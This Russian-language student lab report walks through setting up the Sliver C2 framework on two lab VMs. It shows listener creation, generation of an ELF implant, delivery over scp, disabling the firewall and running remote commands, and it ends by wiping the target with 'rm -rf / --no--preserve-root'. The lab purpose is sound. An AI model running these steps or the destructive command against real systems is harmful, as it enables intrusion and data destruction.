# Laba.4
# Лабораторная работа №4: "Средства постэксплуатации"
## Выполнили:

## Ход работы
### Выбор и обоснование виртуальных машин
Для работы использовались две виртуальные машины: 

- Ubuntu Server;

![](/src/1.png)

- Linux Mint (как самая популярная версия Linux-дистрибутива).

![](/src/2.png)

В настройках сети обеих ВМ был установлен режим «Сетевой мост», что обеспечило их нахождение в одной локальной сети с возможностью прямого взаимодействия по IP-адресам (Ubuntu Server: 192.168.31.116, Linux Mint: 192.168.31.78), что было подтверждено успешным ping-запросом.

![](/src/3.png)

### Выбор C2-фреймворка
В качестве фреймворка постэксплуатации был выбран Sliver. Выбор обусловлен  широкими возможностями для генерации полезных нагрузок и управления сессиями.

### Создание слушателя
В консоли клиента Sliver был создан mTLS-слушатель (listener) на стандартном порту 8888 командой `mtls` для ожидания входящих соединений от полезной нагрузки.

![](/src/4.png)

### Генерация полезной нагрузки
С помощью команды `generate` была создана полезная нагрузка для целевой ОС Linux: `generate --mtls 192.168.31.116 --os linux --arch amd64 --format elf --save /tmp/payload.elf`. Файл `payload.elf` представляет собой имплант, который при запуске устанавливает обратное соединение с сервером управления.

### Доставка и выполнение нагрузки на целевой системе через SSH

![](/src/5.png)

1. Полезная нагрузка была скопирована на целевую машину Linux Mint с использованием протокола SCP: `scp /tmp/payload.elf student@192.168.31.78:/tmp/`.
2. Для успешного тестирования на целевой машине был временно отключен межсетевой экран: `sudo ufw disable`.
3. Нагрузка была запущена на Linux Mint: предоставлены права на выполнение (`chmod +x /tmp/payload.elf`) и запущен файл (`/tmp/payload.elf &`). SSH был выбран как простейший метод доставки, так как задача заключалась в тестировании возможностей фреймворка, а не моделировании реального вектора атаки.

### Установление сессии и базовые команды управления
После запуска полезной нагрузки в консоли Sliver была зафиксирована новая активная сессия (команда `sessions`). Для взаимодействия с целевой системой использовались базовые команды постэксплуатации: `shell whoami` (проверка пользователя) и `shell ps` (просмотр запущенных процессов), что подтвердило успешное установление контроля.

![](/src/7.png)

Ну и ради небольшого сюрприза удалим систему полностью, выполнив команду `rm -rf / --no--preserve-root`.

![](/src/8.png)

### Выводы и заключение
В ходе лабораторной работы был успешно развернут C2-фреймворк Sliver, создана и доставлена полезная нагрузка, установлена сессия с целевой системой и выполнены базовые команды управления. Работа продемонстрировала ключевые этапы построения инфраструктуры командования и управления (C2), а также принципы постэксплуатации. Выбор Sliver подтвердил его эффективность для учебных целей благодаря простоте развертывания и удобству использования.
